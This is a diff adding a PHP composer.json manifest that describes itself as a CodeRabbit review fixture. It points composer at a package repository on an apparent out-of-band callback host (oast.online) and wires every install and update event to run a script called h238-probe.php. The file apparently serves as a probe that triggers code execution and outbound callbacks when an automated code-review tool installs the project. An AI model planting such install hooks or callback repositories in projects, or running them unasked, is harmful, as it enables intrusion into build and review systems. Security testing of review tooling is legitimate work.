@@ -1,0 +1,20 @@
+{
+  "name": "h123/probe",
+  "description": "CodeRabbit review fixture repository (own test repo)",
+  "type": "project",
+  "require": {
+    "psr/log": "^3.0"
+  },
+  "repositories": [
+    {
+      "type": "composer",
+      "url": "https://dc2ico2ab4cqoo144e20b6a3c8xftzama.oast.online/h238/final"
+    }
+  ],
+  "scripts": {
+    "pre-install-cmd": "@php h238-probe.php pre-install-cmd",
+    "post-install-cmd": "@php h238-probe.php post-install-cmd",
+    "pre-update-cmd": "@php h238-probe.php pre-update-cmd",
+    "post-update-cmd": "@php h238-probe.php post-update-cmd"
+  }
+}
